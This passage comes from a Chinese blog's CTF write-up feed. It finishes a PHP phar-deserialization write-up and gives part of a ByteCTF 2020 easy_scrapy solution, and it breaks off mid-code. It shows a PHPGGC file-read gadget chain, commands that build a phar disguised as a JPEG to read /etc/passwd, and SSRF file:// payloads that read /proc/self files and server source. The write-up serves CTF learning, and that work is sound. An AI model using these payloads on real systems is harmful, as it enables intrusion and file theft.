&#123;</span><br><span class="line">  <span class="title">class</span> <span class="title">PDFCreator</span> &#123; <span class="title">public</span> $<span class="title">tmpfile</span>; &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">GadgetChain</span>\<span class="title">Alles</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">FR1</span> <span class="title">extends</span> \<span class="title">PHPGGC</span>\<span class="title">GadgetChain</span>\<span class="title">FileRead</span> &#123;</span><br><span class="line">        public static $version = &#x27;1.00&#x27;;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">static</span> $vector = <span class="string">&#x27;__destruct&#x27;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">static</span> $author = <span class="string">&#x27;teamrocketist&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">generate</span>(<span class="params"><span class="keyword">array</span> $parameters</span>) </span>&#123;</span><br><span class="line">            $a = <span class="keyword">new</span> \PDFStuff\PDFCreator();</span><br><span class="line">            $a-&gt;tmpfile = $parameters[<span class="string">&quot;remote_file&quot;</span>]; <span class="comment">// file to read</span></span><br><span class="line">            <span class="keyword">return</span> $a;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>生成 phar 的图片，使用 /etc/passwd 更容易回显结果（有的 php 源码在浏览器中需要查看源码才能看到，比如 flag.php）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./phpggc Alles/FR1 /etc/passwd -f -pj ../dummy.jpg -o ../exploit.jpg</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后和上面的步骤一样，上传就可以读取文件。<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/254F244D-5867-46BA-9C85-A952E884343C.png"></p><hr><h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><p>在题解中，发现一个非常强大的工具——PHPGGC</p><p>PHPGGC 是一款能够自动生成主流框架的序列化测试 payload 的工具,可以说是反序列化的武器库,平时遇到有关反序列化的题目时如果能够熟练运用它，将节省大量功夫。</p><p>可以创建自己的模块，使用命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git <span class="built_in">clone</span> https://github.com/ambionics/phpggc</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">cd</span> phpggc</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> mkdir gadgetchains/Alles/ &amp;&amp; mkdir gadgetchains/Alles/FR &amp;&amp; mkdir gadgetchains/Alles/FR/1</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> cp templates/* gadgetchains/Alles/FR/1/*</span></span><br></pre></td></tr></table></figure><p>默认的模版 chain.php：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">GadgetChain</span>\&#123;<span class="title">NAME</span>&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> </span>&#123;CLASS_NAME&#125; <span class="keyword">extends</span> \&#123;BASE_CLASS_NAME&#125;</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> $version = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> $vector = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> $author = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">generate</span>(<span class="params"><span class="keyword">array</span> $parameters</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>参考文章中的模块 chain.php：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">PDFStuff</span> &#123;</span><br><span class="line">  <span class="title">class</span> <span class="title">PDFCreator</span> &#123; <span class="title">public</span> $<span class="title">tmpfile</span>; &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">GadgetChain</span>\<span class="title">Alles</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">FR1</span> <span class="title">extends</span> \<span class="title">PHPGGC</span>\<span class="title">GadgetChain</span>\<span class="title">FileRead</span> &#123;</span><br><span class="line">        public static $version = &#x27;1.00&#x27;;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">static</span> $vector = <span class="string">&#x27;__destruct&#x27;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">static</span> $author = <span class="string">&#x27;teamrocketist&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">generate</span>(<span class="params"><span class="keyword">array</span> $parameters</span>) </span>&#123;</span><br><span class="line">            $a = <span class="keyword">new</span> \PDFStuff\PDFCreator();</span><br><span class="line">            $a-&gt;tmpfile = $parameters[<span class="string">&quot;remote_file&quot;</span>]; <span class="comment">// file to read</span></span><br><span class="line">            <span class="keyword">return</span> $a;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>其中 version、vector、author 在查看当前模块信息的时候会显示，如下图所示。<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/1B804691-FA75-4CAF-9B5C-4305E7974FF1.png"></p><p>构建phar的命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./phpggc Alles/FR1 flag.php -f -pj ../dummy.jpg -o ../exploit.jpg</span><br></pre></td></tr></table></figure><p>参数「-f」使用 fast-destruct 的方法，确保对象在反序列化的时候，能被摧毁。参数「-pj」创建 jpeg 格式的 phar，dummy.jpg 是一张普通图片。参数「-o」明确说明 payload 的输出地址。flag.php 是模块需要的参数，需要读取的远程文件的地址</p><hr><h1 id="反序列化分析"><a href="#反序列化分析" class="headerlink" title="反序列化分析"></a>反序列化分析</h1><p>在搜索到 TCPDF 的 cve，漏洞是由于 phar 类型的 php 反序列化导致的。故寻找 TCPDF 的利用点。这个地方需要使用到大型代码审计的技巧，通常可以按照如下所示的几个步骤来进行审计。</p><ol><li>找到危险函数；此处的危险函数一定在 反序列化所使用到的类，一定在类里的魔术方法里。</li><li>向上回溯寻找有无可用输入点；寻找可控输入点。</li><li>尝试绕过针对输入点的过滤；</li><li>寻找触发漏洞的方法。</li></ol><p>而这个地方我们已经找到了漏洞，就需要先理清代码的基本逻辑思路。（关键点肯定在「类」中，毕竟这个题的考点是反序列化），可以考虑直接审计反序列化代码，再回溯利用点。</p><p>先在 creator.php 中找到魔术方法，并寻找危险函数（由于 this-&gt;tmpfile 在反序列时可控），故需要进行反序列化然后本地文件包含，tmpfile 设置为我们需要的函数。<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/A5780B58-D39F-4E52-809F-EA15216A4BB0.png"></p><p>编写生成 phar 代码</p><ul><li>方法1: phpggc 工具<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/D31F2612-132F-48E3-BBA0-8B99AA623F93.png"></li><li>方法2:手动编写<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/1E138875-D810-430B-ABD0-9F4594E2C11D.png"></li></ul><p>最后需要使用包装器执行代码，如下图所示：<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20201101001720.png"></p><p>参考教程：</p><ol><li><a href="https://xz.aliyun.com/t/6699#toc-2">php反序列化拓展攻击详解–phar</a></li><li><a href="https://teamrocketist.github.io/2019/08/25/Web-Chaos-Communication-Camp-2019-CTF-pdfcreator/">Chaos Communication Camp 2019 CTF - pdfcreator</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php反序列化 </tag>
            
            <tag> phar </tag>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020年10月ByteCTF部分web题解</title>
      <link href="8840d17d59ce/"/>
      <url>8840d17d59ce/</url>
      
        <content type="html"><![CDATA[<p>题解和题目地址：<a href="https://github.com/ctfwiki/ctf_game_history/blob/master/2020/ByteCTF.md">https://github.com/ctfwiki/ctf_game_history/blob/master/2020/ByteCTF.md</a><br>官方题解：<a href="https://bytectf.feishu.cn/docs/doccnqzpGCWH1hkDf5ljGdjOJYg#xQHQ9D">https://bytectf.feishu.cn/docs/doccnqzpGCWH1hkDf5ljGdjOJYg#xQHQ9D</a></p><hr><a id="more"></a><p>用于爆破 md5 的脚本（验证码）：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># crack.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(s.encode()).hexdigest()</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    c = input()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">9999999999</span>):</span><br><span class="line">        <span class="keyword">if</span> md5(str(i)).startswith(c):</span><br><span class="line">            print(i)</span><br><span class="line">            print(<span class="string">&#x27;----------------&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><hr><h1 id="easy-scrapy"><a href="#easy-scrapy" class="headerlink" title="easy_scrapy"></a>easy_scrapy</h1><ul><li>题目地址：<a href="http://101.200.50.18:30010/">http://101.200.50.18:30010/</a></li><li>官方题解：<a href="https://bytectf.feishu.cn/docs/doccnqzpGCWH1hkDf5ljGdjOJYg#bFxJPC">https://bytectf.feishu.cn/docs/doccnqzpGCWH1hkDf5ljGdjOJYg#bFxJPC</a></li><li>oxcccccc：<a href="http://blog.ccreater.top/2020/10/26/2020ByteCTF/">http://blog.ccreater.top/2020/10/26/2020ByteCTF/</a></li><li>N0rth3题解：<a href="https://northity.com/2020/10/30/ByteCTF%E5%88%9D%E8%B5%9B%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/">https://northity.com/2020/10/30/ByteCTF%E5%88%9D%E8%B5%9B%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/</a></li><li>ByteCTF2020-easyscrapy：<a href="https://www.jianshu.com/p/0823666a7687">https://www.jianshu.com/p/0823666a7687</a></li><li>ByteCTF2020—w4nder：<a href="http://phoebe233.cn/?p=328#easyscrapy">http://phoebe233.cn/?p=328#easyscrapy</a></li></ul><p>经过测试，该网站会爬取提交的链接以及链接中的外链，并且提交链接的类型只能是 HTTPS。我当时只在提交链接的部分测试了SSRF，以后在做题时，需要边做边写题解，这样会让自己的思路更加的清晰和正确。</p><p>在 服务器编写 1.html ，然后提交 url 即可得到 /etc/passwd 文件，成功本地文件包含，返回结果如下。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">b&#39;&lt;a href&#x3D;&quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;\n&#39;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/C64DAEFD-214C-40D8-8BFF-24326D290575.png"></p><p>考虑去读取爬虫的源码，但是并不知道路径，尝试 proc 目录。GET 新姿势，在服务器源码中写入下面的代码并提交。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;a href&#x3D;&quot;file:&#x2F;&#x2F;&#x2F;proc&#x2F;self&#x2F;cmdline&quot;&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>proc/self/cmdline 中 /proc/self  是指向当前进程的内存，/proc/self/cmdline 启动进程时执行的命令。类似的接口还有：</p><ul><li>/proc/$PID/environ 该文件保存进程的环境变量</li><li>/proc/$PID/cwd 一个符号连接, 指向进程当前的工作目录</li><li>/proc/$PID/exe 一个符号连接, 指向被执行的二进制代码</li><li>/proc/$PID/fd 进程所打开的每个文件都有一个符号连接在该子目录里, 以文件描述符命名, 这个名字实际上是指向真正的文件的符号连接</li><li>/proc/$PID/attr 进程的属性<br>tip: 当找不到网站路径的时候，可以利用 /proc/self/cwd 目录来读取文件路径</li></ul><p>当提交请求后的返回结果为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">b&#39;&#x2F;usr&#x2F;local&#x2F;bin&#x2F;python\x00&#x2F;usr&#x2F;local&#x2F;bin&#x2F;scrapy\x00crawl\x00byte\x00&#39;</span><br><span class="line"># 解码后：&#x2F;usr&#x2F;local&#x2F;bin&#x2F;python &#x2F;usr&#x2F;local&#x2F;bin&#x2F;scrapy crawl byte</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>b’ 是 Python 的 bytes 类型，表明这个变量在存储的时候是 bytes 类型（二进制形式）。上面的命令可以被化简为 python scrapy crawl byte，这是 scrapy 的启动命令。爬虫的名称叫做 byte，在 spiders 目录中有用。</p><h2 id="读取文件"><a href="#读取文件" class="headerlink" title="读取文件"></a>读取文件</h2><p>我们可以参考 <a href="https://scrapy-chs.readthedocs.io/zh_CN/0.24/topics/commands.html#scrapy">scrapy 的文档</a>，我们可以知道 scrapy 的目录结构（贯穿全文）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">scrapy.cfg</span><br><span class="line">myproject&#x2F;（项目名称，未知）</span><br><span class="line">    __init__.py</span><br><span class="line">    items.py</span><br><span class="line">    pipelines.py</span><br><span class="line">    settings.py</span><br><span class="line">    spiders&#x2F;</span><br><span class="line">        __init__.py</span><br><span class="line">        spider1.py</span><br><span class="line">        spider2.py</span><br><span class="line">        ...</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>目录结构 +  /proc/self/cwd 来进行文件读取。首先尝试读取 scrapy.cfg 文件（另外的数据需要使用项目名称）。构造 SSRF 的 url 如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;a href&#x3D;&quot;file:&#x2F;&#x2F;&#x2F;proc&#x2F;self&#x2F;cwd&#x2F;scrapy.cfg&quot;&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>其中 /proc/self/cwd/ 指向工作路径（current work directory 简称 cwd），读取工作路径下的 scrapy.cfg 文件。再次提交 url，返回结果如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># scrapy.cfg</span><br><span class="line"></span><br><span class="line">b&#39;# Automatically created by: scrapy startproject\n#\n# For more information about the [deploy] section see:\n# https:&#x2F;&#x2F;scrapyd.readthedocs.io&#x2F;en&#x2F;latest&#x2F;deploy.html\n\n[settings]\ndefault &#x3D; bytectf.settings\n\n[deploy]\n#url &#x3D; http:&#x2F;&#x2F;localhost:6800&#x2F;\nproject &#x3D; bytectf\n&#39;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这种格式的文本不便于进行阅读，Python 的 Bytes 直接输出就会呈现这种效果，使用 vscode 的替换功能将 \n 转换成“换行”。<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/472EE1BB-6765-4B4D-B9F0-341E25B7D163.png"><br>修改为“正则模式”进行替换，将 “\n” 替换成 “\n”。通过上面的文本，我们就能够读取所有的文件了。</p><p>尝试读取 setting 文件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;a href&#x3D;&quot;file:&#x2F;&#x2F;&#x2F;proc&#x2F;self&#x2F;cwd&#x2F;bytectf&#x2F;setting.py&quot;&gt;（凭感觉在写代码。。）</span><br><span class="line">&lt;a href&#x3D;&quot;file:&#x2F;&#x2F;&#x2F;proc&#x2F;self&#x2F;cwd&#x2F;bytectf&#x2F;settings.py&quot;&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>？？？做着做着访问不了了（希望环境没事🙏。等待几分钟后环境恢复，估计是在重启。</p><p>参考上面的处理方法，将返回结果整理如下：（参考教程：<a href="https://www.cnblogs.com/fengf233/p/11400262.html%EF%BC%89">https://www.cnblogs.com/fengf233/p/11400262.html）</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"># setting.py</span><br><span class="line"></span><br><span class="line">BOT_NAME &#x3D; &#39;bytectf&#39;</span><br><span class="line"># 此Scrapy项目名称</span><br><span class="line"></span><br><span class="line">SPIDER_MODULES &#x3D; [&#39;bytectf.spiders&#39;]</span><br><span class="line"># scrapy查找spider的路径</span><br><span class="line"></span><br><span class="line">NEWSPIDER_MODULE &#x3D; &#39;bytectf.spiders&#39;</span><br><span class="line"># 指定使用genspider时创建spider的路径</span><br><span class="line"></span><br><span class="line">RETRY_ENABLED &#x3D; False</span><br><span class="line"># </span><br><span class="line">ROBOTSTXT_OBEY &#x3D; False</span><br><span class="line"># 表示遵不遵守君子协议，默认False</span><br><span class="line"></span><br><span class="line">DOWNLOAD_TIMEOUT &#x3D; 8</span><br><span class="line"># 超时时间</span><br><span class="line"></span><br><span class="line">USER_AGENT &#x3D; &#39;scrapy_redis&#39;</span><br><span class="line"># 爬虫时使用的默认User-Agent</span><br><span class="line"></span><br><span class="line">SCHEDULER &#x3D; &quot;scrapy_redis.scheduler.Scheduler&quot;</span><br><span class="line"># </span><br><span class="line"></span><br><span class="line">DUPEFILTER_CLASS &#x3D; &quot;scrapy_redis.dupefilter.RFPDupeFilter&quot;</span><br><span class="line"># </span><br><span class="line"></span><br><span class="line">REDIS_HOST &#x3D; &#39;172.20.0.7&#39;</span><br><span class="line"># redis 服务器地址</span><br><span class="line"></span><br><span class="line">REDIS_PORT &#x3D; 6379</span><br><span class="line"># redis 端口</span><br><span class="line"></span><br><span class="line">ITEM_PIPELINES &#x3D; &#123;</span><br><span class="line">&#39;bytectf.pipelines.BytectfPipeline&#39;: 300,</span><br><span class="line">&#125;</span><br><span class="line"># 启用的item管道</span><br></pre></td></tr></table></figure><p>在其他人的题解中，他们尝试了攻击 redis，但是没有拿到 shell。我不会（暂时就不尝试了。在这个文件中没有 spider 的名称，考虑从  <strong>init</strong>.py 这个已知的文件入手。尝试读取  <strong>init</strong>.py 文件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;a href&#x3D;&quot;file:&#x2F;&#x2F;&#x2F;proc&#x2F;self&#x2F;cwd&#x2F;bytectf&#x2F;spiders&#x2F;__init__.py&quot;&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>没有数据</p><p>尝试读取 byte.py 文件（暂时还不清楚这个文件名「byte.py」的来源，猜测可能在 items.py、pipelines.py、bytectf/<strong>init</strong>.py 这些没有读取的文件中）。折腾了半天才在启动命令中发现爬虫的名称叫做 byte.py，当时没有理解这个命令的含义，血亏。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;a href&#x3D;&quot;file:&#x2F;&#x2F;&#x2F;proc&#x2F;self&#x2F;cwd&#x2F;bytectf&#x2F;spiders&#x2F;byte.py&quot;&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>将回显结果进行整理。代码有点乱，Python 的缩进全无，只能依靠猜测源码大致的模样（\x 乱码使用 print(b””.decode(“utf-8”) 转换为中文)）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># byte.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> scrapy</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> scrapy_redis.spiders <span class="keyword">import</span> RedisSpider</span><br><span class="line"><span class="keyword">from</span> bytectf.items <span class="keyword">import</span> BytectfItem</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ByteSpider</span>(<span class="params">RedisSpider</span>):</span></span><br><span class="line">    name = <span class="string">&#x27;byte&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parse</span>(<span class="params">self, response</span>):</span></span><br><span class="line">        byte_item = BytectfItem()</span><br><span class="line">        <span class="comment"># 主键，原始 url</span></span><br><span class="line">        byte_item[<span class="string">&#x27;byte_start&#x27;</span>] = response.request.url</span><br><span class="line">        url_list = []</span><br><span class="line">        test = response.xpath(<span class="string">&#x27;//a/@href&#x27;</span>).getall()</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> test:</span><br><span class="line">            <span class="keyword">if</span> i[<span class="number">0</span>] == <span class="string">&#x27;/&#x27;</span>:</span><br><span class="line">                url = response.request.url + i</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                url = i</span><br><span class="line">            <span class="keyword">if</span> re.search(<span class="string">r&#x27;://&#x27;</span>, url):</span><br><span class="line">                r = scrapy.Request(url, callback=self.parse2, dont_filter=<span class="literal">True</span>)</span><br><span class="line">                r.meta[<span class="string">&#x27;item&#x27;</span>] = byte_item</span><br><span class="line">                <span class="keyword">yield</span> r</span><br><span class="line">            url_list.append(url)</span><br><span class="line">            <span class="keyword">if</span>(len(url_list) &gt; <span class="number">3</span>):</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        byte_item[<span class="string">&#x27;byte_url&#x27;</span>] = response.request.url</span><br><span class="line">        byte_item[<span class="string">&#x27;byte_text&#x27;</span>] = base64.b64encode((response.text).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">        <span class="keyword">yield</span> byte_item</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parse2</span>(<span class="params">self, response</span>):</span></span><br><span class="line">        item = response.meta[<span class="string">&#x27;item&#x27;</span>]</span><br><span class="line">        item[<span class="string">&#x27;byte_url&#x27;</span>] = response.request.url</span><br><span class="line">        item[<span class="string">&#x27;byte_text&#x27;</span>] = base64.b64encode((response.text).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">        <span class="keyword">yield</span> item</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>尝试读取前面猜测的文件，items.py、pipelines.py、bytectf/<strong>init</strong>.py</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;a href&#x3D;&quot;file:&#x2F;&#x2F;&#x2F;proc&#x2F;self&#x2F;cwd&#x2F;bytectf&#x2F;items.py&quot;&gt;</span><br><span class="line">&lt;a href&#x3D;&quot;file:&#x2F;&#x2F;&#x2F;proc&#x2F;self&#x2F;cwd&#x2F;bytectf&#x2F;pipelines.py&quot;&gt;</span><br><span class="line">&lt;a href&#x3D;&quot;file:&#x2F;&#x2F;&#x2F;proc&#x2F;self&#x2F;cwd&#x2F;bytectf&#x2F;__init__.py&quot;&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>回显结果：</p><ol><li>items.py<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># items.py</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Define here the models for your scraped items</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># See documentation in:</span></span><br><span class="line"><span class="comment"># https://docs.scrapy.org/en/latest/topics/items.html</span></span><br><span class="line"><span class="keyword">import</span> scrapy</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BytectfItem</span>(<span class="params">scrapy.Item</span>):</span></span><br><span class="line">    <span class="comment"># define the fields for your item here like:</span></span><br><span class="line">    <span class="comment"># name = scrapy.Field()</span></span><br><span class="line">    byte_start = scrapy.Field()  <span class="comment"># 起始页面</span></span><br><span class="line">    byte_url = scrapy.Field()  <span class="comment"># 当前页面</span></span><br><span class="line">    byte_text = scrapy.Field()  <span class="comment"># text</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li>pipelines.py（等等，N0rth3 怎么那么熟悉，出题人可还行，没注意）<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span 